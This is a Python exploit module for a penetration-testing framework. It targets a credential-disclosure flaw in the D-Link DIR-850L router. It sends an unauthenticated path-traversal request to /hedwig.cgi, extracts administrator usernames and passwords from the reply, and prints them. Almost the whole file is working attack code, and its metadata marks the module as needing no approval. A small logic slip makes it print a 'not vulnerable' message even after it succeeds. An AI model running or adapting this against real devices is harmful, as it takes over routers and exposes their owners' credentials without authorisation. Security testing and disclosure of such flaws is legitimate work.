#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DIR-850L Creds Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'D-Link DIR-850L Creds Disclosure',
        'description': 'Module exploits D-Link DIR-850L credentials disclosure vulnerability, which allows retrieving administrative credentials.',
        'author': ['Hack2Win', 'GH0st3rs'],
        
        'platform': Platform.LINUX,
        'references': ['https://packetstormsecurity.com/files/145097/dlink-850-admin-creds-retriever.sh.txt', 'https://www.rapid7.com/db/modules/exploit/linux/http/dlink_dir850l_unauth_exec', 'https://blogs.securiteam.com/index.php/archives/3364'],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        self.credentials = []

        if self.check():
            print_success("Target seems to be vulnerable")
            print_table(("Username", "Password"), *self.credentials)

        print_error("Target does not seem to be vulnerable")
    def check(self):
        headers = {
            "Content-Type": "text/xml",
        }
        cookies = {
            "uid": self.random_text(8),
        }
        data = (
            "<?xml version =\"1.0\" encoding=\"utf-8\"?>"
            "<postxml>"
            "<module>"
            "<service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>"
            "</module>"
            "</postxml>"
        )
        response = self.http_request(
            method="POST",
            path="/hedwig.cgi",
            data=data,
            headers=headers,
            cookies=cookies
        )

        if response and response.status_code == 200 and "No modules for Hedwig" in response.text:
            pattern = r"<uid>.*</uid>\s*<name>(.*?)</name>\s*<usrid>.*</usrid>\s*<password>(.*?)</password>"
            creds = re.findall(pattern, response.text)
            if creds:
                self.credentials = creds
                return True

        return False
